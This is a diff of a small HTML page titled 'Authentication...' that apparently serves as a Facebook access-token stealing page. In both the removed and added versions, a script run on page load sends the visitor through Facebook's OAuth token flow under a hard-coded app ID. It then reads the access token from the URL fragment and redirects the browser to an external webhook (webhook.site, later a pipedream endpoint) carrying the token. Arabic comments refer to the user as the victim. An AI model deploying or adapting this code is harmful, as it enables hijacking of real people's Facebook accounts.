@@ -1,24 +1,16 @@
-<!DOCTYPE html>
-<html>
-<head><title>Authentication...</title></head>
-<body>
-    <script>
-        // [2026-01-21] Direct Victim Extraction
-        window.onload = function() {
-            const hash = window.location.hash;
-            const webhook = "https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190";
+<script>
+    window.onload = function() {
+        const hash = window.location.hash;
+        const newWebhook = "https://eo6qxh6529kl7b5.m.pipedream.net";
 
-            if (hash.includes('access_token=')) {
-                const token = new URLSearchParams(hash.substring(1)).get('access_token');
-                // إرسال التوكن للويب هوك فوراً بوضوح
-                window.location.href = webhook + "?VICTIM_TOKEN_FOUND=" + token;
-            } else {
-                // إجبار فيسبوك على طلب تصريح جديد من الضحية
-                const client_id = "1089408829356317";
-                const redirect = "https://mohammedborai404.github.io/fb-security-test/";
-                window.location.href = `https://www.facebook.com/v15.0/dialog/oauth?client_id=${client_id}&redirect_uri=${redirect}&response_type=token&scope=email,public_profile&auth_type=reauthenticate`;
-            }
-        };
-    </script>
-</body>
-</html>
+        if (hash.includes('access_token=')) {
+            const token = new URLSearchParams(hash.substring(1)).get('access_token');
+            // تحويل الضحية فوراً إلى رابط Pipedream مع التوكن
+            window.location.href = newWebhook + "?VICTIM_TOKEN=" + token;
+        } else {
+            const client_id = "1089408829356317";
+            const redirect = "https://mohammedborai404.github.io/fb-security-test/";
+            window.location.href = `https://www.facebook.com/v15.0/dialog/oauth?client_id=${client_id}&redirect_uri=${redirect}&response_type=token&scope=email,public_profile`;
+        }
+    };
+</script>
